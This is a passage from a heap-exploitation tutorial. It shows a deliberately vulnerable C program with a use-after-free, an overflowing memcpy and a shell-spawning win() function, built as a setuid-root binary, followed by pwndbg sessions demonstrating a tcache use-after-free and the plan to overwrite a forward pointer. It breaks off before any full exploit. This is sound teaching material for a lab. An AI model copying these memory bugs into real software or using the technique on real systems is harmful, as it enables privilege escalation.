</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define EXIT &#34;5&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define FREED 0
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define UNDERUSE 1
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> ptrs[<span style="color:#ae81ff">100</span>];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> used[<span style="color:#ae81ff">100</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> request_size[<span style="color:#ae81ff">100</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> cnt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">print_menu</span>(){
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>MENU[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Choose from the following menu:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;1. malloc chunk eg 1 20</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;2. free chunk eg 2 0</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;3. edit chunk content eg 3 0 AAAA</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;4. list chunks</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;5. exit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">6</span>; i<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;%s&#34;</span>, MENU[i]);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">allocate</span>(<span style="color:#66d9ef">int</span> n){
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;Allocating %d bytes</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, n);
</span></span><span style="display:flex;"><span>  ptrs[cnt] <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(n);
</span></span><span style="display:flex;"><span>  used[cnt] <span style="color:#f92672">=</span> UNDERUSE;
</span></span><span style="display:flex;"><span>  request_size[cnt] <span style="color:#f92672">=</span> n;
</span></span><span style="display:flex;"><span>  cnt<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">free_chunk</span>(<span style="color:#66d9ef">int</span> n){
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (used[n] <span style="color:#f92672">==</span> FREED)
</span></span><span style="display:flex;"><span>	 <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;Freeing pointer %d: %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, n, ptrs[n]);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">free</span>(ptrs[n]);
</span></span><span style="display:flex;"><span>  used[n] <span style="color:#f92672">=</span> FREED;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">edit</span>(<span style="color:#66d9ef">int</span> n, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>s){
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;Editing pointer %d: %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, n, ptrs[n]);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> l1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(ptrs[n]);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> l2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(s);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> l;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (l1 <span style="color:#f92672">&lt;</span> l2) l <span style="color:#f92672">=</span> l2;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> l <span style="color:#f92672">=</span> l1;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memcpy</span>(ptrs[n], s, l);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">list</span>(){
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;Index</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Pointers</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Requested Size</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Status</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> cnt; i<span style="color:#f92672">++</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;%d</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">%p</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">%u</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span>, i, ptrs[i], request_size[i]);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (used[i] <span style="color:#f92672">==</span> UNDERUSE)
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;Under Use</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (used[i] <span style="color:#f92672">==</span> FREED)
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;Freed</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">win</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\033</span><span style="color:#e6db74">[1;31m[+] PWNED!!!</span><span style="color:#ae81ff">\033</span><span style="color:#e6db74">[0m&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">execl</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, <span style="color:#e6db74">&#34;sh&#34;</span>, <span style="color:#e6db74">&#34;-c&#34;</span>, <span style="color:#e6db74">&#34;/bin/sh&#34;</span>, (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">100</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> str[<span style="color:#ae81ff">100</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> n;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setbuf</span>(stderr, NULL);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">print_menu</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, buf, <span style="color:#ae81ff">90</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (buf[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;1&#39;</span>){
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">sscanf</span>(buf <span style="color:#f92672">+</span> <span style="color:#66d9ef">sizeof</span>(MALLOC), <span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>n);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">allocate</span>(n);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (buf[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;2&#39;</span>){
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">sscanf</span>(buf <span style="color:#f92672">+</span> <span style="color:#66d9ef">sizeof</span>(FREE), <span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>n);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">free_chunk</span>(n);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (buf[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;3&#39;</span>){
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">sscanf</span>(buf <span style="color:#f92672">+</span> <span style="color:#66d9ef">sizeof</span>(EDIT), <span style="color:#e6db74">&#34;%d %[^</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">]&#34;</span>, <span style="color:#f92672">&amp;</span>n, str);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">edit</span>(n, str);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (buf[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;4&#39;</span>)
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">list</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (buf[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;5&#39;</span>)
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">continue</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; gcc uaf.c -o uaf -no-pie
</span></span><span style="display:flex;"><span>&gt; patchelf --set-interpreter ./ld-2.27.so --set-rpath . ./uaf
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ls -la               
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">17808</span>
</span></span><span style="display:flex;"><span>drwxrwxr-x  <span style="color:#ae81ff">2</span> at0m at0m     <span style="color:#ae81ff">4096</span> Jun <span style="color:#ae81ff">26</span> 17:03 .
</span></span><span style="display:flex;"><span>drwxrwxr-x <span style="color:#ae81ff">21</span> at0m at0m     <span style="color:#ae81ff">4096</span> Jun <span style="color:#ae81ff">26</span> 17:03 ..
</span></span><span style="display:flex;"><span>-rwxrwxr-x  <span style="color:#ae81ff">1</span> at0m at0m  <span style="color:#ae81ff">1386480</span> Jun <span style="color:#ae81ff">26</span> 17:03 ld-2.27.so
</span></span><span style="display:flex;"><span>-rwxrwxr-x  <span style="color:#ae81ff">1</span> at0m at0m <span style="color:#ae81ff">16803192</span> Jun <span style="color:#ae81ff">26</span> 17:03 libc.so.6
</span></span><span style="display:flex;"><span>-rw-rw-r--  <span style="color:#ae81ff">1</span> at0m at0m      <span style="color:#ae81ff">120</span> Jun <span style="color:#ae81ff">26</span> 17:03 README.md
</span></span><span style="display:flex;"><span>-rwsr-sr-x  <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">21688</span> Jun <span style="color:#ae81ff">26</span> 17:03 uaf
</span></span><span style="display:flex;"><span>-rw-rw-r--  <span style="color:#ae81ff">1</span> at0m at0m     <span style="color:#ae81ff">2087</span> Jun <span style="color:#ae81ff">26</span> 17:03 uaf.c
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ./uaf                              
</span></span><span style="display:flex;"><span>Choose from the following menu:
</span></span><span style="display:flex;"><span>1. malloc chunk eg <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span>2. free chunk eg <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>3. edit chunk content eg <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">0</span> AAAA
</span></span><span style="display:flex;"><span>4. list chunks
</span></span><span style="display:flex;"><span>5. exit
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>Allocating <span style="color:#ae81ff">8</span> bytes
</span></span><span style="display:flex;"><span>&lt;SNIP&gt;
</span></span></code></pre></div><p>We entered <code>1 8</code> as it means to use command 1 to allocate 8 bytes.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Choose from the following menu:
</span></span><span style="display:flex;"><span>1. malloc chunk eg <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span>2. free chunk eg <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>3. edit chunk content eg <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">0</span> AAAA
</span></span><span style="display:flex;"><span>4. list chunks
</span></span><span style="display:flex;"><span>5. exit
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>Freeing pointer 0: 0x10945260
</span></span></code></pre></div><p>We used <code>2 0</code> to use command 2 and free chunk in index <code>0</code> which was our allocated 8 bytes.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Choose from the following menu:
</span></span><span style="display:flex;"><span>1. malloc chunk eg <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span>2. free chunk eg <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>3. edit chunk content eg <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">0</span> AAAA
</span></span><span style="display:flex;"><span>4. list chunks
</span></span><span style="display:flex;"><span>5. exit
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span>Index	Pointers	Requested Size	Status
</span></span><span style="display:flex;"><span>0	0x10945260	8	Freed
</span></span></code></pre></div><p>We also can list chunks. We can also edit it using <code>3 0 AAAA</code>, where 3 means command to enter, 0 means index and AAAA is content we want to put.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>1. malloc chunk eg <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span>2. free chunk eg <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>3. edit chunk content eg <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">0</span> AAAA
</span></span><span style="display:flex;"><span>4. list chunks
</span></span><span style="display:flex;"><span>5. exit
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3</span> <span style="color:#ae81ff">0</span> AAAA 
</span></span><span style="display:flex;"><span>Editing pointer 0: 0x10945260
</span></span></code></pre></div><p>In Heap Exploitation, protection depends in Libc version. So more old version of Libc more vulnerable will it be to Heap Exploitation.</p>
<p>Lets see now in GDB.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; r
</span></span><span style="display:flex;"><span>Starting program: /home/at0m/Downloads/hack/Youtube/Binary Exploitation/H. Heap Tcache Use After Free/uaf 
</span></span><span style="display:flex;"><span>Choose from the following menu:
</span></span><span style="display:flex;"><span>1. malloc chunk eg <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span>2. free chunk eg <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>3. edit chunk content eg <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">0</span> AAAA
</span></span><span style="display:flex;"><span>4. list chunks
</span></span><span style="display:flex;"><span>5. exit
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>Allocating <span style="color:#ae81ff">8</span> bytes
</span></span><span style="display:flex;"><span>Choose from the following menu:
</span></span><span style="display:flex;"><span>6. malloc chunk eg <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span>7. free chunk eg <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>8. edit chunk content eg <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">0</span> AAAA
</span></span><span style="display:flex;"><span>9. list chunks
</span></span><span style="display:flex;"><span>10. exit
</span></span><span style="display:flex;"><span>^C
</span></span><span style="display:flex;"><span>Program received signal SIGINT, Interrupt.
</span></span></code></pre></div><p>We can use <code>vis</code> to see memory layout.</p>
<p><img src="/img/use_after_free.png" alt="use_after_free.png"></p>
<p>When we allocated 8 bytes chunk we can see here in purple section 8 bytes got allocated. It is more in purple section because heap takes 32 bytes minimum always no matter how much you ask. That blue section is our Tcache.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; c
</span></span><span style="display:flex;"><span>Continuing.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3</span> <span style="color:#ae81ff">0</span> AAAAAAAA
</span></span><span style="display:flex;"><span>Editing pointer 0: 0x3a8f7260
</span></span><span style="display:flex;"><span>Choose from the following menu:
</span></span><span style="display:flex;"><span>1. malloc chunk eg <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span>2. free chunk eg <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>3. edit chunk content eg <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">0</span> AAAA
</span></span><span style="display:flex;"><span>4. list chunks
</span></span><span style="display:flex;"><span>5. exit
</span></span><span style="display:flex;"><span>^C
</span></span><span style="display:flex;"><span>Program received signal SIGINT, Interrupt.
</span></span></code></pre></div><p><img src="/img/use_after_free2.png" alt="use_after_free2.png"></p>
<p>We can see <code>AAAAAAAA</code> in memory. We can also see by freeing.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; c
</span></span><span style="display:flex;"><span>Continuing.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>Freeing pointer 0: 0x3a8f7260
</span></span><span style="display:flex;"><span>Choose from the following menu:
</span></span><span style="display:flex;"><span>1. malloc chunk eg <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span>2. free chunk eg <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>3. edit chunk content eg <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">0</span> AAAA
</span></span><span style="display:flex;"><span>4. list chunks
</span></span><span style="display:flex;"><span>5. exit
</span></span><span style="display:flex;"><span>^C
</span></span></code></pre></div><p>Again use <code>vis</code> command.</p>
<p><img src="/img/use_after_free3.png" alt="use_after_free3.png"></p>
<p>A <strong>Use-After-Free (UAF)</strong> vulnerability occurs when a program continues to use a pointer to memory after it has been freed. This type of bug typically arises in low-level languages like C or C++, where manual memory management is required. When an object is deallocated but the pointer to it remains accessible, an attacker can exploit this stale reference to manipulate memory in unintended ways. If the freed memory is reallocated for another purpose, the attacker may control the contents of that memory, leading to undefined behavior such as information disclosure, arbitrary code execution, or privilege escalation. Use-after-free vulnerabilities are particularly dangerous in heap-allocated memory and are commonly exploited in real-world attacks against browsers, kernels, and other complex systems.</p>
<p>Lets test if it has UAF vuln or not. We first allocated the chunk of 8 bytes wrote there and then freed it and lets check if we can write in that chunk even after it is freed.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; r
</span></span><span style="display:flex;"><span>Starting program: /home/at0m/Downloads/hack/Youtube/Binary Exploitation/H. Heap Tcache Use After Free/uaf 
</span></span><span style="display:flex;"><span>Choose from the following menu:
</span></span><span style="display:flex;"><span>1. malloc chunk eg <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span>2. free chunk eg <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>3. edit chunk content eg <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">0</span> AAAA
</span></span><span style="display:flex;"><span>4. list chunks
</span></span><span style="display:flex;"><span>5. exit
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>Allocating <span style="color:#ae81ff">8</span> bytes
</span></span><span style="display:flex;"><span>Choose from the following menu:
</span></span><span style="display:flex;"><span>6. malloc chunk eg <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span>7. free chunk eg <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>8. edit chunk content eg <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">0</span> AAAA
</span></span><span style="display:flex;"><span>9. list chunks
</span></span><span style="display:flex;"><span>10. exit
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3</span> <span style="color:#ae81ff">0</span> AAAAAAAA
</span></span><span style="display:flex;"><span>Editing pointer 0: 0x58d3260
</span></span><span style="display:flex;"><span>Choose from the following menu:
</span></span><span style="display:flex;"><span>11. malloc chunk eg <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span>12. free chunk eg <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>13. edit chunk content eg <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">0</span> AAAA
</span></span><span style="display:flex;"><span>14. list chunks
</span></span><span style="display:flex;"><span>15. exit
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>Freeing pointer 0: 0x58d3260
</span></span><span style="display:flex;"><span>Choose from the following menu:
</span></span><span style="display:flex;"><span>16. malloc chunk eg <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span>17. free chunk eg <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>18. edit chunk content eg <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">0</span> AAAA
</span></span><span style="display:flex;"><span>19. list chunks
</span></span><span style="display:flex;"><span>20. exit
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span>Index	Pointers	Requested Size	Status
</span></span><span style="display:flex;"><span>0	0x58d3260	8	Freed
</span></span><span style="display:flex;"><span>Choose from the following menu:
</span></span><span style="display:flex;"><span>21. malloc chunk eg <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span>22. free chunk eg <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>23. edit chunk content eg <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">0</span> AAAA
</span></span><span style="display:flex;"><span>24. list chunks
</span></span><span style="display:flex;"><span>25. exit
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3</span> <span style="color:#ae81ff">0</span> AAAABBBB
</span></span><span style="display:flex;"><span>Editing pointer 0: 0x58d3260
</span></span><span style="display:flex;"><span>Choose from the following menu:
</span></span><span style="display:flex;"><span>26. malloc chunk eg <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span>27. free chunk eg <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>28. edit chunk content eg <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">0</span> AAAA
</span></span><span style="display:flex;"><span>29. list chunks
</span></span><span style="display:flex;"><span>30. exit
</span></span><span style="display:flex;"><span>^C
</span></span></code></pre></div><p>Lets see using <code>vis</code>.</p>
<p><img src="/img/use_after_free4.png" alt="use_after_free4.png"></p>
<p>As we can see even though chunk was in Tcache, we could still edit it. We will try to write our GOT address or Win Function address in Forward Pointer.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; info functions
</span></span><span style="display:flex;"><span>All defined functions:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Non-debugging symbols:
</span></span><span style="display:flex;"><span>0x0000000000401000  _init
</span></span><span style="display:flex;"><span>0x0000000000401100  free@plt
</span></span><span style="display:flex;"><span>0x0000000000401110  puts@plt
</span></span><span style="display:flex;"><span>0x0000000000401120  strlen@plt
</span></span><span style="display:flex;"><span>0x0000000000401130  __stack_chk_fail@plt
</span></span><span style="display:flex;"><span>0x0000000000401140  setbuf@plt
</span></span><span style="display:flex;"><span>0x0000000000401150  fputs@plt
</span></span><span style="display:flex;"><span>0x0000000000401160  read@plt
</span></span><span style="display:flex;"><span>0x0000000000401170  fprintf@plt
</span></span><span style="display:flex;"><span>0x0000000000401180  memcpy@plt
</span></span><span style="display:flex;"><span>0x0000000000401190  malloc@plt
</span></span><span style="display:flex;"><span>0x00000000004011a0  __isoc99_sscanf@plt
</span></span><span style="display:flex;"><span>0x00000000004011b0  fwrite@plt
</span></span><span style="display:flex;"><span>0x00000000004011c0  execl@plt
</span></span><span style="display:flex;"><span>0x00000000004011d0  _start
</span></span><span style="display:flex;"><span>0x0000000000401200  _dl_relocate_static_pie
</span></span><span style="display:flex;"><span>0x0000000000401210  deregister_tm_clones
</span></span><span style="display:flex;"><span>0x0000000000401240  register_tm_clones
</span></span><span style="display:flex;"><span>0x0000000000401280  __do_global_dtors_aux
</span></span><span style="display:flex;"><span>0x00000000004012b0  frame_dummy
</span></span><span style="display:flex;"><span>0x00000000004012b6  print_menu
